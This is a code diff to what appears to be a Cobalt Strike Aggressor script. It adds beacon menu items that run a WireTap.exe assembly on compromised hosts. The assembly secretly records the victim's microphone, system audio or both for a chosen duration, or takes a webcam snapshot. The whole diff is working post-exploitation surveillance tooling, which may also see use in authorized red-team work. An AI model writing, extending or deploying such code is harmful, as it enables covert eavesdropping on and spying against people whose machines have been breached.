@@ -52,5 +52,30 @@ sub Send {
         }, @ids => $1));
     }	
 
-            }
+			item "Record Mic" {
+			$bid = $1['@'];
+			$dialog = dialog("WireTap", %(time => "30s",bid => $bid), &WireTap_listen);
+			dialog_description($dialog, "record_mic - Record audio from the attached microphone (line-in). record_sys - Record audio from the system speakers (line-out). record_audio - Record audio from both the microphone and the speakers. Time suffix can be s/m/h. Example: record_audio 30s");
+			drow_combobox($dialog, "type", "type:", @("record_mic","record_sys","record_audio"));
+			drow_text($dialog, "time", "time:  ");			
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        }
+sub WireTap_listen {
+	$arg = join(' ',  @($3['type'],$3['time']));
+	bexecute_assembly($bid, script_resource("/script/WireTap.exe"), $arg);
+}	
+			item "WebCam Shot" {
+			$bid = $1['@'];
+			$dialog = dialog("WireTap", %(bid => $bid), &WireTap_webcam);
+			dialog_description($dialog, "Open WebCam to shot");	
+			drow_combobox($dialog, "type", "type:", @("capture_webcam"));			
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        }
+sub WireTap_webcam {
+	$arg = join(' ',  @($3['type']));
+	bexecute_assembly($bid, script_resource("/script/WireTap.exe"), $arg);
+}	
+}
 
